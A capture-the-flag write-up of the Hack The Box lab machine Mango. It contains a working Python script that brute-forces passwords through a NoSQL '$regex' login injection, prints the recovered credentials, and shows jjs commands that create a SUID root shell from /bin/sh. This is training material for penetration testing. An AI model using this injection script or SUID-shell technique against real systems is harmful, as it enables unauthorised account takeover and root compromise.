# Mango — From NoSQL Authentication Bypass to Root

> **Hack The Box — Mango**
> **Difficulty:** Medium
> **Target:** `10.129.229.185`
> **OS:** Linux

---

## 01 — Overview

Mango is a medium-difficulty Linux machine on Hack The Box.

The initial enumeration revealed SSH, HTTP, and HTTPS services. Port 80 returned `403 Forbidden`, while HTTPS exposed a **Mango | Search Base** application.

Further enumeration revealed the hostname `mango.htb`, along with a staging subdomain identified through the TLS certificate:

```text
staging-order.mango.htb
```

Testing the authentication mechanism on the staging application revealed a way to manipulate the password parameter using a **NoSQL-style regular expression condition**.

A Python script was used to enumerate valid characters and recover passwords for the `admin` and `mango` accounts.

SSH access was then obtained as `mango`, followed by access to the `admin` account.

Finally, enumeration of SUID binaries revealed the Java `jjs` binary. JavaScript executed through `jjs` was abused to create a SUID shell, resulting in root-level effective privileges.

---

# 02 — Recon: Mapping the Target

## Full Port Scan

The initial all-port scan was started against:

```bash
nmap 10.129.229.185 -p-
```

The discovered open ports were:

| Port | State | Service |
| ---: | ----- | ------- |
|   22 | Open  | SSH     |
|   80 | Open  | HTTP    |
|  443 | Open  | HTTPS   |

---

## Service and Version Detection

Service enumeration identified:

```text
22/tcp  open  ssh    OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp  open  http   Apache httpd 2.4.29
443/tcp open  https  Apache httpd 2.4.29
```

The HTTPS certificate contained the hostname:

```text
staging-order.mango.htb
```

The HTTPS application title was:

```text
Mango | Search Base
```

The certificate also identified:

```text
admin@mango.htb
```

as the certificate email address.

---

# 03 — Web Enumeration: Entering the Mango Application

Burp Suite was used to inspect the web traffic while `mango.htb` was added to the local hosts file.

Port 80 returned:

```text
403 Forbidden
```

Therefore, enumeration continued against HTTPS.

The HTTPS application presented a search-engine-style interface.

Source inspection and further enumeration were performed to identify additional functionality and hosts.

---

# 04 — Hidden Host: `staging-order.mango.htb`

Subdomain fuzzing did not immediately return useful results.

However, the TLS certificate discovered during Nmap enumeration contained:

```text
staging-order.mango.htb
```

This provided an additional application to investigate.

The staging application contained an authentication panel.

The authentication mechanism became the main focus of testing.

---

# 05 — Authentication Testing: NoSQL Injection

The login functionality accepted parameters that could be manipulated using a regular-expression condition.

The following Python script was used to enumerate the passwords character by character:

```python
from requests import post
from string import printable

url = 'http://staging-order.mango.htb/'

admin_pass = ['0', '2', '3', '9', 'c', 't', 'B', 'K', 'S', '!', '#', '\$',
              '\.', '>', '\\', '\^', '\|']

mango_pass = ['3', '5', '8', 'f', 'h', 'm', 'H', 'K', 'R', 'U', 'X', '\$',
              '\.', '\\', ']', '\^', '{', '\|', '~']


def sendPayload(user, word):
    valid = admin_pass if user == 'admin' else mango_pass

    for char in valid:
        regex = '^{}.*'.format(word + char)

        data = {
            'username': user,
            'password[$regex]': regex,
            'login': 'login'
        }

        response = post(url, data=data, allow_redirects=False)

        if response.status_code == 302:
            return char

    return None


def getUser():
    for user in ['admin', 'mango']:
        password = ''

        while True:
            char = sendPayload(user, password)

            if char != None:
                password += char
            else:
                print "Password for {} found: {}".format(user, password)
                break


if __name__ == '__main__':
    getUser()
```

The important parameter was:

```text
password[$regex]
```

The script tested candidate characters and used the HTTP response code to determine whether each character was valid.

---

# 06 — Credential Discovery

Running the script with Python 2:

```bash
python2 man.py
```

returned:

```text
Password for admin found: t9KcS3>!0B#2
Password for mango found: h3mXK8RhU~f{]f5H
```

The recovered credentials were:

| Username | Password           |
| -------- | ------------------ |
| `admin`  | `t9KcS3>!0B#2`     |
| `mango`  | `h3mXK8RhU~f{]f5H` |

These credentials provided the next step toward SSH access.

---

# 07 — User Access: `mango` → `admin`

SSH access was obtained using the recovered `mango` credentials.

Once on the machine, the `admin` user's home directory contained:

```text
user.txt
```

The user flag was therefore available under:

```text
/home/admin/user.txt
```

The notes then moved directly into privilege-escalation enumeration.

---

# 08 — Privilege Escalation: Hunting SUID Binaries

The system was searched for SUID binaries:

```bash
find / -type f -perm -4000 2>/dev/null
```

The results included:

```text
/usr/bin/run-mailcap
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
```

The interesting binary was:

```text
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

---

# 09 — `jjs`: Abusing JavaScript Execution

The `jjs` binary was executed:

```bash
jjs
```

It displayed:

```text
Warning: The jjs tool is planned to be removed from a future JDK release
jjs>
```

From inside the JavaScript shell, `java.lang.Runtime` was used to execute operating-system commands.

First, a copy of `/bin/sh` was created:

```javascript
Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/sh /tmp/sh').waitFor()
```

The command returned:

```text
0
```

The newly created shell was then given the SUID permission:

```javascript
Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /tmp/sh').waitFor()
```

Again, the command returned:

```text
0
```

This created a SUID shell at:

```text
/tmp/sh
```

---

# 10 — Root: Effective UID 0

The SUID shell was executed with preserved privileges:

```bash
/tmp/sh -p
```

The resulting identity was:

```bash
id
```

Output:

```text
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
```

The important value here was:

```text
euid=0(root)
```

This confirmed root-level effective privileges.

The root flag was then accessed with:

```bash
cat /root/root.txt
```

---

# 11 — Attack Path Summary

```text
                    ┌─────────────────────┐
                    │ 10.129.229.185      │
                    └──────────┬──────────┘
                               │
                       Port Enumeration
                               │
             ┌─────────────────┼─────────────────┐
             │                 │                 │
            SSH               HTTP             HTTPS
             │                 │                 │
             │                 │          Mango Search Base
             │                 │                 │
             │                 │        Certificate Enumeration
             │                 │                 │
             │                 │    staging-order.mango.htb
             │                 │                 │
             │                 │          Login Panel
             │                 │                 │
             │                 │         NoSQL Injection
             │                 │                 │
             │                 │      Password Enumeration
             │                 │                 │
             │                 │        ┌────────┴────────┐
             │                 │        │                 │
             │                 │      mango             admin
             │                 │        │                 │
             │                 │        └────────┬────────┘
             │                 │                 │
             │                 │          User Access
             │                 │                 │
             │                 │           SUID Enum
             │                 │                 │
             │                 │              jjs
             │                 │                 │
             │                 │       Java Runtime Abuse
             │                 │                 │
             │                 │        SUID /tmp/sh
             │                 │                 │
             │                 │              root
             │                 │
             └─────────────────┴─────────────────┘
```

---

# 12 — Key Takeaways

### Network Enumeration

The initial scan revealed only three exposed services, making it important to investigate the web services thoroughly rather than relying on a large attack surface.

### TLS Certificates

The HTTPS certificate disclosed:

```text
staging-order.mango.htb
```

Certificate information can sometimes reveal additional hostnames that are not immediately found through basic subdomain enumeration.

### NoSQL Injection

The authentication mechanism accepted a regular-expression-based parameter:

```text
password[$regex]
```

This allowed the password to be enumerated character by character.

### Credential Discovery

Two valid credentials were recovered:

```text
admin : t9KcS3>!0B#2
mango : h3mXK8RhU~f{]f5H
```

### SUID Enumeration

Searching for SUID binaries is an important Linux privilege-escalation step.

In this case, the Java `jjs` binary stood out from the results.

### Java Runtime Abuse

The `jjs` environment provided access to Java's `Runtime` functionality, allowing operating-system commands to be executed.

This was ultimately used to create and execute a SUID shell with an effective UID of root.

---

# 13 — Tools Used

| Tool       | Purpose                                    |
| ---------- | ------------------------------------------ |
| Nmap       | Port and service enumeration               |
| Burp Suite | Web request and authentication analysis    |
| Python 2   | NoSQL password enumeration script          |
| SSH        | Remote access                              |
| `find`     | SUID binary enumeration                    |
| `jjs`      | JavaScript execution and command execution |

---

# 14 — Conclusion

Mango demonstrates how a relatively small external attack surface can still lead to complete system compromise.

The assessment began with three exposed services. HTTPS enumeration revealed additional hostname information, leading to the staging application.

The authentication mechanism was vulnerable to **NoSQL injection through regular-expression matching**, allowing valid passwords to be recovered character by character.

The recovered credentials provided user-level access, after which SUID enumeration revealed the Java `jjs` binary.

By abusing Java's runtime execution functionality, a SUID shell was created and executed with an effective UID of root.

The complete chain was:

**Port Enumeration → TLS Certificate Discovery → Staging Host → NoSQL Injection → Credential Recovery → User Access → SUID Enumeration → `jjs` Abuse → Root**

The machine was a strong practical demonstration of why both **web-layer testing and Linux privilege-escalation enumeration** are essential during a penetration test.
